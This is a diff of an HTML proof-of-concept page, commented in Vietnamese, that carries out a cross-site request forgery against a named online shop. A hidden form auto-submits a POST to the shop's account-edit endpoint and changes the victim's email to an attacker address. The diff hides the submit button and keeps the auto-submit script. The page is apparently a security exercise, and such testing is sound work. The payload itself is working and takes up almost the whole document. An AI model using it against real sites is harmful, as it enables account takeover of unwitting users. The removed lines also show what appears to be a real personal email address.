@@ -2973,16 +2973,20 @@
     ></script>
     <!-- Form để gửi yêu cầu POST giả mạo -->
     <form
+      id="csrfForm"
       method="POST"
       action="https://mydecobox.shop/my-account/edit-account/"
     >
-      <input type="hidden" name="user_email" value="lcnhu.uit@gmail.com" />
-      <!-- Thêm token CSRF -->
-      <input type="submit" value="Submit" />
+      <input type="hidden" name="user_email" value="attacker@example.com" />
+      <!-- Email mà kẻ tấn công muốn thay đổi -->
+      <!-- Thêm CSRF token nếu cần -->
+      <input type="submit" value="Submit" style="display: none" />
+      <!-- Ẩn nút submit -->
     </form>
 
     <script>
-      document.forms[0].submit(); // Tự động gửi form khi trang được tải
+      // Tự động gửi form khi trang được tải
+      document.getElementById("csrfForm").submit();
     </script>
   </body>
 </html>
